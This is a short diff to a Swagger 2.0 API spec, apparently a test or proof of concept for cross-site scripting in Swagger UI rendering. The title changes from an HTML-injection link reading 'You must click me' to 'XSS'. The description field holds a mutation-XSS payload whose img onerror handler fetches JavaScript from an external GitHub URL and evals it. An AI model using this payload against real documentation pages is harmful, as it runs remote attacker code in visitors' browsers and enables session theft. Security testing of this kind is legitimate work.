@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
-  title: <a href=http://google.com><font size=100 color=red>You must click me</font></a> 
+  title: XSS 
   description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/woodsky24/xsstesting/main/js.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
